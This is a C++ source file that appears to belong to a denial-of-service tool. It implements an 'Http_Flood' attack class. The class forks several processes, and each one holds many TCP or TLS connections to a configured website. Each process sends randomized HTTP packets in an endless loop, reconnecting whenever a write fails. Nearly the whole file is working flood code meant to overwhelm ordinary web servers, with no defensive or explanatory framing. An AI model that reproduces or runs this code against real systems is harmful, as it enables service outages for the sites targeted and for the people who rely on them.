#include <netdb.h>
#include <cstring>
#include <csignal>
#include <unistd.h>
#include <array>
#include <openssl/ssl.h>

#include "Http_Flood.hpp"


Http_Flood::Http_Flood(const config *conf, Logger *logger) : Attack_Vector(conf, logger){

}

void Http_Flood::run() {
    for (int x = 0; x < conf->THREADS; x++) {
        if(fork()){
            if(conf->UseSSL){
                attack_ssl(&x);
            }else{
                attack(&x);
            }
        }
    }
    getc(stdin);
}

int Http_Flood::make_socket(const char *host, const char *port, int sock_type) {
    struct addrinfo hints{}, *servinfo, *p;
    int sock = 0, r;
    std::string message = std::string("Connecting-> ") + host + ":" + port;
    logger->Log(&message, Logger::Info);
    bzero(&hints, sizeof(hints));
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = sock_type;
    if((r=getaddrinfo(host, port, &hints, &servinfo))!=0) {
        message = std::string("Getaddrinfo-> ") + gai_strerror(r);
        logger->Log(&message, Logger::Error);
        exit(EXIT_FAILURE);
    }
    for(p = servinfo; p != nullptr; p = p->ai_next) {
        if((sock = socket(p->ai_family, p->ai_socktype, p->ai_protocol)) == -1) {
            continue;
        }
        if(connect(sock, p->ai_addr, p->ai_addrlen) == -1) {
            close(sock);
            continue;
        }
        break;
    }
    if(p == nullptr) {
        if(servinfo){
            freeaddrinfo(servinfo);
        }
        logger->Log("No connection could be made", Logger::Error);
        exit(EXIT_FAILURE);
    }
    if(servinfo){
        freeaddrinfo(servinfo);
    }
    message = std::string("Connected-> ") + host + ":" + port;
    logger->Log(&message, Logger::Info);
    return sock;
}

void Http_Flood::broke(int) {
    // pass
}

SSL_CTX *Http_Flood::InitCTX() {
    const SSL_METHOD *method{TLSv1_1_client_method()};
    SSL_CTX *ctx;
    OpenSSL_add_ssl_algorithms();
    SSL_load_error_strings();
    ctx = SSL_CTX_new(method);
    if (ctx == nullptr){
        logger->Log("Unable to connect using ssl", Logger::Error);
        exit(EXIT_FAILURE);
    }
    return ctx;
}

SSL *Http_Flood::Apply_SSL(int socket, SSL_CTX *ctx) {
    SSL *ssl = SSL_new(ctx);
    SSL_set_fd(ssl, socket);
    if(SSL_connect(ssl) == -1){
        logger->Log("Unable to connect using ssl", Logger::Error);
        exit(EXIT_FAILURE);
    }
    return ssl;
}

void Http_Flood::cleanup(const int *socket) {
    close(*socket);
}

void Http_Flood::cleanup(SSL *ssl, const int *socket, SSL_CTX *ctx) {
    SSL_free(ssl);
    close(*socket);
    SSL_CTX_free(ctx);
}

void Http_Flood::read_socket(int socket) {
    char chunk[128];
    while(read(socket , chunk, 128)){
        bzero(chunk, sizeof(chunk));
    }
}

void Http_Flood::read_socket(SSL *ssl) {
    char chunk[128];
    while(SSL_read(ssl , chunk, 128)){
        bzero(chunk, sizeof(chunk));
    }
}

int Http_Flood::write_socket(int socket, const char *string, int length) {
    return static_cast<int>(write(socket, string, static_cast<size_t>(length)));
}

int Http_Flood::write_socket(SSL *ssl, const char *string, int length) {
    return (SSL_write(ssl, string, length));
}

void Http_Flood::attack(const int *id) {
    int r;
    std::vector<int> sockets;
    for (int x = 0; x < conf->CONNECTIONS; x++) {
        sockets.push_back(0);
    }
    signal(SIGPIPE, &Http_Flood::broke);
    while(true) {
        static std::string message;
        for (int x = 0; x < conf->CONNECTIONS; x++) {
            if(!sockets[x]){
                sockets[x] = make_socket(conf->website.c_str(), conf->port.c_str(), SOCK_STREAM);
            }
            const char *packet = Randomizer::randomPacket(conf);
            if((r = write_socket(sockets[x], packet, static_cast<int>(strlen(packet)))) == -1){
                cleanup(&sockets[x]);
                sockets[x] = make_socket(conf->website.c_str(), conf->port.c_str(), SOCK_STREAM);
            }else{
                if(conf->GetResponse){
                    read_socket(sockets[x]);
                }
                message = std::string("Socket[") + std::to_string(x) + "->"
                          + std::to_string(sockets[x]) + "] -> " + std::to_string(r);
                logger->Log(&message, Logger::Info);
                message = std::to_string(*id) + ": Voly Sent";
                logger->Log(&message, Logger::Info);
            }
        }
        message = std::to_string(*id) + ": Voly Sent";
        logger->Log(&message, Logger::Info);
        usleep(static_cast<__useconds_t>(conf->delay));
    }
}

void Http_Flood::attack_ssl(const int *id) {
    int r;
    std::vector<int> sockets;
    std::vector<SSL_CTX *> CTXs;
    std::vector<SSL *> SSLs;
    for (int x = 0; x < conf->CONNECTIONS; x++) {
        sockets.push_back(0);
        SSLs.push_back(nullptr);
        CTXs.push_back(nullptr);
    }
    signal(SIGPIPE, &Http_Flood::broke);
    while(true) {
        static std::string message;
        for (int x = 0; x < conf->CONNECTIONS; x++) {
            if(!sockets[x]){
                sockets[x] = make_socket(conf->website.c_str(), conf->port.c_str(), SOCK_STREAM);
                CTXs[x] = InitCTX();
                SSLs[x] = Apply_SSL(sockets[x], CTXs[x]);
            }
            const char *packet = Randomizer::randomPacket(conf);
            if((r = write_socket(SSLs[x], packet, static_cast<int>(strlen(packet)))) == -1){
                cleanup(SSLs[x], &sockets[x], CTXs[x]);
                sockets[x] = make_socket(conf->website.c_str(), conf->port.c_str(), SOCK_STREAM);
                CTXs[x] = InitCTX();
                SSLs[x] = Apply_SSL(sockets[x], CTXs[x]);
            }else{
                if(conf->GetResponse){
                    read_socket(SSLs[x]);
                }
                message = std::string("Socket[") + std::to_string(x) + "->"
                          + std::to_string(sockets[x]) + "] -> " + std::to_string(r);
                logger->Log(&message, Logger::Info);
                message = std::to_string(*id) + ": Voly Sent";
                logger->Log(&message, Logger::Info);
            }
        }
        message = std::to_string(*id) + ": Voly Sent";
        logger->Log(&message, Logger::Info);
        usleep(static_cast<__useconds_t>(conf->delay));
    }
}

